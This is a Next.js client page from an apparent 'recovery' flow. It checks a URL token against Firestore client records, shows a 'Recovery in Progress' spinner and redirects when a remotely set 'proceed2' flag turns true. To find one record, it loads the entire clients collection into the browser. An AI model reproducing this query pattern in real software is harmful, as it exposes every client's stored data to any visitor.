"use client";

import { useEffect, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { collection, getDocs, doc, onSnapshot } from "firebase/firestore";
import { db } from "@/lib/firebase";
import SvgStack from "@/components/SvgStack";
import Image from "next/image";
import bgImage from "@/components/Image_fx__2_-removebg-preview 1.svg";

export default function Page5Client() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const token = searchParams.get("token");

  const [client, setClient] = useState<any>(null);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    if (!token) {
      router.replace("/invalid");
      return;
    }

    let unsubscribe: (() => void) | undefined;

    const init = async () => {
      const snapshot = await getDocs(collection(db, "clients"));
      const clientDoc = snapshot.docs.find(
        (d) => d.data().accessLinkId === token
      );

      if (!clientDoc) {
        router.replace("/invalid");
        return;
      }

      setClient({ id: clientDoc.id, ...clientDoc.data() });
      setLoading(false);

      const clientRef = doc(db, "clients", clientDoc.id);
      unsubscribe = onSnapshot(clientRef, (snap) => {
        if (snap.data()?.proceed2 === true) {
          router.replace(`/page6?token=${token}`);
        }
      });
    };

    init();

    return () => {
      if (unsubscribe) unsubscribe();
    };
  }, [token, router]);

  if (loading) {
    return (
      <main className="flex items-center justify-center h-screen text-white">
        Loading recovery...
      </main>
    );
  }

  return (
    <main className="relative w-full h-screen overflow-hidden flex items-center justify-center">
      <div className="absolute inset-0">
        <SvgStack />
        <Image
          src={bgImage}
          alt="Background"
          className="absolute inset-0 -z-10 object-contain"
        />
      </div>

      <div className="relative z-10 flex flex-col items-center space-y-6">
        <div className="w-20 h-20 border-4 border-teal-400 border-t-transparent rounded-full animate-spin" />
        <h2 className="text-white text-xl font-bold">Recovery in Progress</h2>
      </div>
    </main>
  );
}
